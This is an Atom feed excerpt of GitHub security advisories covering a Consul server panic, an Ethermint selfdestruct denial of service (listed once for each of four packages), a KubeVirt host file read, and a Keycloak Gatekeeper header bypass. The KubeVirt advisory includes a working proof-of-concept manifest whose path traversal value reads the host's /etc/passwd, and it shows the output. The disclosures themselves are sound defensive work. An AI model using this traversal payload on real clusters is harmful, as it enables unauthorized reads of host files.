            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hj93-5fg3-3chr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-02-25T00:01:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/consul] HashiCorp Consul Ingress Gateway Panic Can Shutdown Servers]]></title>
        <id>https://github.com/advisories/GHSA-hj93-5fg3-3chr</id>
        <link href="https://github.com/advisories/GHSA-hj93-5fg3-3chr"/>
        <updated>2022-08-18T19:07:24.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Consul and Consul Enterprise 1.8.0 through 1.9.14, 1.10.7, and 1.11.2 has Uncontrolled Resource Consumption. Clusters with at least one ingress gateway configured may allow a user with <code>service:write</code> permission to register a specifically-defined service that can cause the Consul server to panic and shutdown. Versions 1.9.15, 1.10.8, and 1.11.3 contain patches for the problem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24687">https://nvd.nist.gov/vuln/detail/CVE-2022-24687</a></li>
<li><a href="https://discuss.hashicorp.com">https://discuss.hashicorp.com</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/">https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20220331-0006/">https://security.netapp.com/advisory/ntap-20220331-0006/</a></li>
<li><a href="https://security.gentoo.org/glsa/202208-09">https://security.gentoo.org/glsa/202208-09</a></li>
<li><a href="https://github.com/advisories/GHSA-hj93-5fg3-3chr">https://github.com/advisories/GHSA-hj93-5fg3-3chr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hj93-5fg3-3chr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-02-25T00:01:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/Kava-Labs/kava] Ethermint vulnerable to DoS through unintended Contract Selfdestruct]]></title>
        <id>https://github.com/advisories/GHSA-f92v-grc2-w2fg</id>
        <link href="https://github.com/advisories/GHSA-f92v-grc2-w2fg"/>
        <updated>2022-08-18T19:04:47.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-report">Vulnerability Report</h1>
<h2 id="impact">Impact</h2>
<p>Smart contract applications that make use of the <code>selfdestruct</code> functionality and their end-users.</p>
<h2 id="classification">Classification</h2>
<p>The vulnerability has been classified as <code>high</code> with a CVSS score of <code>8.2</code>. It has the potential to create a denial-of-service to all contracts that can invoke the <a href="https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347"><code>selfdestruct</code></a> function to destroy a smart contract. </p>
<h2 id="users-impacted">Users Impacted</h2>
<p>Due to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.</p>
<h2 id="disclosure">Disclosure</h2>
<p>In Ethermint running versions before <code>v0.17.2</code>, the contract <code>selfdestruct</code> invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the <a href="https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203"><code>DeleteAccount</code></a> function, all contracts that used the identical bytecode (i.e shared the same <code>CodeHash</code>) will also stop working once one contract invokes <code>selfdestruct</code>, even though the other contracts did not invoke the <code>selfdestruct</code> OPCODE.</p>
<h3 id="additional-details">Additional Details</h3>
<p>The same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry <code>bytecode hash --&gt; bytecode</code> which is shared by those contracts. Unfortunately, when one of the contracts invokes <code>selfdestruct</code>, it will remove the corresponding <code>bytecode hash -&gt; bytecode</code> entry, and thus it disables all the contracts that share the same bytecode.</p>
<p>The attack scenario is as follows:</p>
<ol>
<li>The malicious attacker identifies a vulnerable contract that can invoke <code>selfdestruct</code></li>
<li>The attacker deploys a copy of the contract with identical bytecode</li>
<li>Finally, the attacker triggers the <code>selfdestruct</code> operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).</li>
</ol>
<h2 id="patches">Patches</h2>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>This vulnerability has been patched in Ethermint versions ≥<a href="https://github.com/evmos/ethermint/releases/tag/v0.18.0">v0.18.0</a>. The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.</p>
<h4 id="details">Details</h4>
<p>The patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.
At the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on <code>selfdestruct</code> invocations. This behavior is the same with go-ethereum.</p>
<h2 id="workarounds">Workarounds</h2>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>If a contract is subject to DoS due to this issue, the user can redeploy the same contract, <em>i.e</em> with identical bytecode, so that the original contract's code is recovered.</p>
<p>The new contract deployment restores the <code>bytecode hash -&gt; bytecode</code> entry in the internal state.</p>
<h2 id="references">References</h2>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Reach out to the Core Team in <a href="https://discord.gg/evmos">Discord</a></li>
</ul>
<ul>
<li>Open a discussion in <a href="https://github.com/evmos/ethermint/discussions">evmos/ethermint</a></li>
<li>Email us at <a href="mailto:security@evmos.org">security@evmos.org</a> for security questions</li>
<li>For Press, email us at <a href="mailto:evmos@west-comms.com">evmos@west-comms.com</a>.</li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to the </p>
<ul>
<li>Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.</li>
<li>Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg">https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35936">https://nvd.nist.gov/vuln/detail/CVE-2022-35936</a></li>
<li><a href="https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451">https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451</a></li>
<li><a href="https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203">https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203</a></li>
<li><a href="https://github.com/advisories/GHSA-f92v-grc2-w2fg">https://github.com/advisories/GHSA-f92v-grc2-w2fg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f92v-grc2-w2fg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-18T19:04:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/crypto-org-chain/cronos] Ethermint vulnerable to DoS through unintended Contract Selfdestruct]]></title>
        <id>https://github.com/advisories/GHSA-f92v-grc2-w2fg</id>
        <link href="https://github.com/advisories/GHSA-f92v-grc2-w2fg"/>
        <updated>2022-08-18T19:04:47.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-report">Vulnerability Report</h1>
<h2 id="impact">Impact</h2>
<p>Smart contract applications that make use of the <code>selfdestruct</code> functionality and their end-users.</p>
<h2 id="classification">Classification</h2>
<p>The vulnerability has been classified as <code>high</code> with a CVSS score of <code>8.2</code>. It has the potential to create a denial-of-service to all contracts that can invoke the <a href="https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347"><code>selfdestruct</code></a> function to destroy a smart contract. </p>
<h2 id="users-impacted">Users Impacted</h2>
<p>Due to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.</p>
<h2 id="disclosure">Disclosure</h2>
<p>In Ethermint running versions before <code>v0.17.2</code>, the contract <code>selfdestruct</code> invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the <a href="https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203"><code>DeleteAccount</code></a> function, all contracts that used the identical bytecode (i.e shared the same <code>CodeHash</code>) will also stop working once one contract invokes <code>selfdestruct</code>, even though the other contracts did not invoke the <code>selfdestruct</code> OPCODE.</p>
<h3 id="additional-details">Additional Details</h3>
<p>The same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry <code>bytecode hash --&gt; bytecode</code> which is shared by those contracts. Unfortunately, when one of the contracts invokes <code>selfdestruct</code>, it will remove the corresponding <code>bytecode hash -&gt; bytecode</code> entry, and thus it disables all the contracts that share the same bytecode.</p>
<p>The attack scenario is as follows:</p>
<ol>
<li>The malicious attacker identifies a vulnerable contract that can invoke <code>selfdestruct</code></li>
<li>The attacker deploys a copy of the contract with identical bytecode</li>
<li>Finally, the attacker triggers the <code>selfdestruct</code> operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).</li>
</ol>
<h2 id="patches">Patches</h2>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>This vulnerability has been patched in Ethermint versions ≥<a href="https://github.com/evmos/ethermint/releases/tag/v0.18.0">v0.18.0</a>. The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.</p>
<h4 id="details">Details</h4>
<p>The patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.
At the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on <code>selfdestruct</code> invocations. This behavior is the same with go-ethereum.</p>
<h2 id="workarounds">Workarounds</h2>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>If a contract is subject to DoS due to this issue, the user can redeploy the same contract, <em>i.e</em> with identical bytecode, so that the original contract's code is recovered.</p>
<p>The new contract deployment restores the <code>bytecode hash -&gt; bytecode</code> entry in the internal state.</p>
<h2 id="references">References</h2>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Reach out to the Core Team in <a href="https://discord.gg/evmos">Discord</a></li>
</ul>
<ul>
<li>Open a discussion in <a href="https://github.com/evmos/ethermint/discussions">evmos/ethermint</a></li>
<li>Email us at <a href="mailto:security@evmos.org">security@evmos.org</a> for security questions</li>
<li>For Press, email us at <a href="mailto:evmos@west-comms.com">evmos@west-comms.com</a>.</li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to the </p>
<ul>
<li>Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.</li>
<li>Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg">https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35936">https://nvd.nist.gov/vuln/detail/CVE-2022-35936</a></li>
<li><a href="https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451">https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451</a></li>
<li><a href="https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203">https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203</a></li>
<li><a href="https://github.com/advisories/GHSA-f92v-grc2-w2fg">https://github.com/advisories/GHSA-f92v-grc2-w2fg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f92v-grc2-w2fg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-18T19:04:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos] Ethermint vulnerable to DoS through unintended Contract Selfdestruct]]></title>
        <id>https://github.com/advisories/GHSA-f92v-grc2-w2fg</id>
        <link href="https://github.com/advisories/GHSA-f92v-grc2-w2fg"/>
        <updated>2022-08-18T19:04:47.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-report">Vulnerability Report</h1>
<h2 id="impact">Impact</h2>
<p>Smart contract applications that make use of the <code>selfdestruct</code> functionality and their end-users.</p>
<h2 id="classification">Classification</h2>
<p>The vulnerability has been classified as <code>high</code> with a CVSS score of <code>8.2</code>. It has the potential to create a denial-of-service to all contracts that can invoke the <a href="https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347"><code>selfdestruct</code></a> function to destroy a smart contract. </p>
<h2 id="users-impacted">Users Impacted</h2>
<p>Due to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.</p>
<h2 id="disclosure">Disclosure</h2>
<p>In Ethermint running versions before <code>v0.17.2</code>, the contract <code>selfdestruct</code> invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the <a href="https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203"><code>DeleteAccount</code></a> function, all contracts that used the identical bytecode (i.e shared the same <code>CodeHash</code>) will also stop working once one contract invokes <code>selfdestruct</code>, even though the other contracts did not invoke the <code>selfdestruct</code> OPCODE.</p>
<h3 id="additional-details">Additional Details</h3>
<p>The same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry <code>bytecode hash --&gt; bytecode</code> which is shared by those contracts. Unfortunately, when one of the contracts invokes <code>selfdestruct</code>, it will remove the corresponding <code>bytecode hash -&gt; bytecode</code> entry, and thus it disables all the contracts that share the same bytecode.</p>
<p>The attack scenario is as follows:</p>
<ol>
<li>The malicious attacker identifies a vulnerable contract that can invoke <code>selfdestruct</code></li>
<li>The attacker deploys a copy of the contract with identical bytecode</li>
<li>Finally, the attacker triggers the <code>selfdestruct</code> operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).</li>
</ol>
<h2 id="patches">Patches</h2>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>This vulnerability has been patched in Ethermint versions ≥<a href="https://github.com/evmos/ethermint/releases/tag/v0.18.0">v0.18.0</a>. The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.</p>
<h4 id="details">Details</h4>
<p>The patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.
At the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on <code>selfdestruct</code> invocations. This behavior is the same with go-ethereum.</p>
<h2 id="workarounds">Workarounds</h2>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>If a contract is subject to DoS due to this issue, the user can redeploy the same contract, <em>i.e</em> with identical bytecode, so that the original contract's code is recovered.</p>
<p>The new contract deployment restores the <code>bytecode hash -&gt; bytecode</code> entry in the internal state.</p>
<h2 id="references">References</h2>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Reach out to the Core Team in <a href="https://discord.gg/evmos">Discord</a></li>
</ul>
<ul>
<li>Open a discussion in <a href="https://github.com/evmos/ethermint/discussions">evmos/ethermint</a></li>
<li>Email us at <a href="mailto:security@evmos.org">security@evmos.org</a> for security questions</li>
<li>For Press, email us at <a href="mailto:evmos@west-comms.com">evmos@west-comms.com</a>.</li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to the </p>
<ul>
<li>Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.</li>
<li>Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg">https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35936">https://nvd.nist.gov/vuln/detail/CVE-2022-35936</a></li>
<li><a href="https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451">https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451</a></li>
<li><a href="https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203">https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203</a></li>
<li><a href="https://github.com/advisories/GHSA-f92v-grc2-w2fg">https://github.com/advisories/GHSA-f92v-grc2-w2fg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f92v-grc2-w2fg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-18T19:04:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/ethermint] Ethermint vulnerable to DoS through unintended Contract Selfdestruct]]></title>
        <id>https://github.com/advisories/GHSA-f92v-grc2-w2fg</id>
        <link href="https://github.com/advisories/GHSA-f92v-grc2-w2fg"/>
        <updated>2022-08-18T19:04:47.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-report">Vulnerability Report</h1>
<h2 id="impact">Impact</h2>
<p>Smart contract applications that make use of the <code>selfdestruct</code> functionality and their end-users.</p>
<h2 id="classification">Classification</h2>
<p>The vulnerability has been classified as <code>high</code> with a CVSS score of <code>8.2</code>. It has the potential to create a denial-of-service to all contracts that can invoke the <a href="https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347"><code>selfdestruct</code></a> function to destroy a smart contract. </p>
<h2 id="users-impacted">Users Impacted</h2>
<p>Due to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.</p>
<h2 id="disclosure">Disclosure</h2>
<p>In Ethermint running versions before <code>v0.17.2</code>, the contract <code>selfdestruct</code> invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the <a href="https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203"><code>DeleteAccount</code></a> function, all contracts that used the identical bytecode (i.e shared the same <code>CodeHash</code>) will also stop working once one contract invokes <code>selfdestruct</code>, even though the other contracts did not invoke the <code>selfdestruct</code> OPCODE.</p>
<h3 id="additional-details">Additional Details</h3>
<p>The same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry <code>bytecode hash --&gt; bytecode</code> which is shared by those contracts. Unfortunately, when one of the contracts invokes <code>selfdestruct</code>, it will remove the corresponding <code>bytecode hash -&gt; bytecode</code> entry, and thus it disables all the contracts that share the same bytecode.</p>
<p>The attack scenario is as follows:</p>
<ol>
<li>The malicious attacker identifies a vulnerable contract that can invoke <code>selfdestruct</code></li>
<li>The attacker deploys a copy of the contract with identical bytecode</li>
<li>Finally, the attacker triggers the <code>selfdestruct</code> operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).</li>
</ol>
<h2 id="patches">Patches</h2>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>This vulnerability has been patched in Ethermint versions ≥<a href="https://github.com/evmos/ethermint/releases/tag/v0.18.0">v0.18.0</a>. The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.</p>
<h4 id="details">Details</h4>
<p>The patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.
At the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on <code>selfdestruct</code> invocations. This behavior is the same with go-ethereum.</p>
<h2 id="workarounds">Workarounds</h2>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>If a contract is subject to DoS due to this issue, the user can redeploy the same contract, <em>i.e</em> with identical bytecode, so that the original contract's code is recovered.</p>
<p>The new contract deployment restores the <code>bytecode hash -&gt; bytecode</code> entry in the internal state.</p>
<h2 id="references">References</h2>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Reach out to the Core Team in <a href="https://discord.gg/evmos">Discord</a></li>
</ul>
<ul>
<li>Open a discussion in <a href="https://github.com/evmos/ethermint/discussions">evmos/ethermint</a></li>
<li>Email us at <a href="mailto:security@evmos.org">security@evmos.org</a> for security questions</li>
<li>For Press, email us at <a href="mailto:evmos@west-comms.com">evmos@west-comms.com</a>.</li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to the </p>
<ul>
<li>Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.</li>
<li>Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg">https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35936">https://nvd.nist.gov/vuln/detail/CVE-2022-35936</a></li>
<li><a href="https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451">https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451</a></li>
<li><a href="https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203">https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203</a></li>
<li><a href="https://github.com/advisories/GHSA-f92v-grc2-w2fg">https://github.com/advisories/GHSA-f92v-grc2-w2fg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f92v-grc2-w2fg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-18T19:04:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kubevirt.io/kubevirt] KubeVirt arbitrary host file read from the VM]]></title>
        <id>https://github.com/advisories/GHSA-cvx8-ppmc-78hm</id>
        <link href="https://github.com/advisories/GHSA-cvx8-ppmc-78hm"/>
        <updated>2022-08-19T17:10:16.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Summary</strong>
As part of a Kubevirt audit performed by NCC group, a finding dealing with systemic lack of path sanitization which leads to a path traversal was identified.  Google tested the exploitability of the paths in the audit report and identified that when combined with another vulnerability one of the paths leads to an arbitrary file read on the host from the VM.</p>
<p>The read operations are limited to files which are publicly readable or which are readable for UID 107 or GID 107. /proc/self/&lt;&gt; is not accessible.</p>
<p><strong>Severity</strong></p>
<p>Moderate - The vulnerability is proven to exist in an open source version of KubeVirt by NCC Group while being combined with Systemic Lack of Path Sanitization, which leads to Path traversal.</p>
<p><strong>Proof of Concept</strong></p>
<p>The initial VMI specifications can be written as such to reproduce the issue:</p>
<pre><code>
apiVersion: kubevirt.io/v1
kind: VirtualMachineInstance
metadata:
  name: vmi-fedora
spec:
  domain:
    devices:
      disks:
      - disk:
          bus: virtio
        name: containerdisk
      - disk:
          bus: virtio
        name: cloudinitdisk
      - disk:
          bus: virtio
        name: containerdisk1
      rng: {}
    resources:
      requests:
        memory: 1024M
  terminationGracePeriodSeconds: 0
  volumes:
  - containerDisk:
      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0
    name: containerdisk
  - containerDisk:
      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0
      path: test3/../../../../../../../../etc/passwd
    name: containerdisk1
  - cloudInitNoCloud:
      userData: |
        #!/bin/sh
        echo 'just something to make cirros happy'
    name: cloudinitdisk

</code></pre>
<p>The VMI can then be started through kubectl apply -f vm-test-ncc.yaml.
The requested file is accessible once the VM is up and can be accessed under /dev/vdc.</p>
<p>Depending on the environment, path may contain more or less /.., something that can easily be tested by checking the events until the VMI can start without failure.
Restrictions </p>
<p>SELinux may mitigate this vulnerability.</p>
<p>When using a node with selinux, selinux denies the access and the VM start was aborted:</p>
<pre><code>
19s         Warning   SyncFailed                virtualmachineinstance/vmi-fedora    server error. command SyncVMI failed: "preparing ephemeral container disk images failed: stat /var/run/kubevirt/container-disks/disk_0.img: permission denied"

type=AVC msg=audit(1651828898.296:1266): avc:  denied  { setattr } for  pid=44402 comm="rpc-worker" name="passwd" dev="vda1" ino=691477 scontext=system_u:system_r:virt_launcher.process:s0:c255,c849 tcontext=system_u:object_r:passwd_file_t:s0 tclass=file permissive=1
</code></pre>
<p>After making selinux permissive the VM can boot and access /etc/passwd from the node within the guest:</p>
<pre><code>
$ sudo cat /dev/vdc
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
[...]
</code></pre>
<p><strong>Further Analysis</strong>
In order to mitigate this vulnerability, Sanitize imagePath in pkg/container-disk/container-disk.go following ISE best practices described and Add checks in pkg/virt-api/webhooks/validating-webhook/admitters/vmi-create-admitter.go</p>
<p><strong>Timeline</strong>
Date reported: 05/10/2022
Date fixed: N/A
Date disclosed: 08/08/2022</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm">https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm</a></li>
<li><a href="https://github.com/advisories/GHSA-cvx8-ppmc-78hm">https://github.com/advisories/GHSA-cvx8-ppmc-78hm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvx8-ppmc-78hm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-18T19:02:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/keycloak/keycloak-gatekeeper] Keycloak Gatekeeper vulnerable to bypass on using lower case HTTP headers]]></title>
        <id>https://github.com/advisories/GHSA-jh6m-3pqw-242h</id>
        <link href="https://github.com/advisories/GHSA-jh6m-3pqw-242h"/>
        <updated>2022-08-12T20:52:15.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in all versions of the deprecated package Keycloak Gatekeeper, where on using lower case HTTP headers (via cURL) we can bypass our Gatekeeper. Lower case headers are also accepted by some webservers (e.g. Jetty). This means there is no protection when we put a Gatekeeper in front of a Jetty server and use lowercase headers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-14359">https://nvd.nist.gov/vuln/detail/CVE-2020-14359</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1868591">https://bugzilla.redhat.com/show_bug.cgi?id=1868591</a></li>
<li><a href="https://issues.jboss.org/browse/KEYCLOAK-14090">https://issues.jboss.org/browse/KEYCLOAK-14090</a></li>
<li><a href="https://github.com/keycloak/keycloak/issues/12934">https://github.com/keycloak/keycloak/issues/12934</a></li>
<li><a href="https://web.archive.org/web/20190613000352/github.com/keycloak/keycloak-gatekeeper">https://web.archive.org/web/20190613000352/github.com/keycloak/keycloak-gatekeeper</a></li>
<li><a href="https://github.com/advisories/GHSA-jh6m-3pqw-242h">https://github.com/advisories/GHSA-jh6m-3pqw-242h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh6m-3pqw-242h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-02-09T00:56:04.000Z</published>
    </entry>
</feed>